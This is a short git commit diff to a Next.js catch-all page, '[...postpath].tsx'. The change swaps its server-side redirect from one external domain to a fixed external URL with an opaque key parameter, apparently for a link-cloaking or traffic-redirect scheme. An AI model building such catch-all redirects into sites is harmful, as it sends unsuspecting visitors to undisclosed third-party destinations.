bf3fe28c47a6ab50636084944319a6ba1b8b6f6a
Ghulam Nabi <nabeelshoro@gmail.com>
2023-10-01 19:50:24 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://wondersquizshow.fun/` + encodeURI(path as string)
+					`https://choruscompanion.com/e9d26g8z?key=d1534f28fe31dce6e1583f067bb27dd4`
 				}`,
 			},
 		};
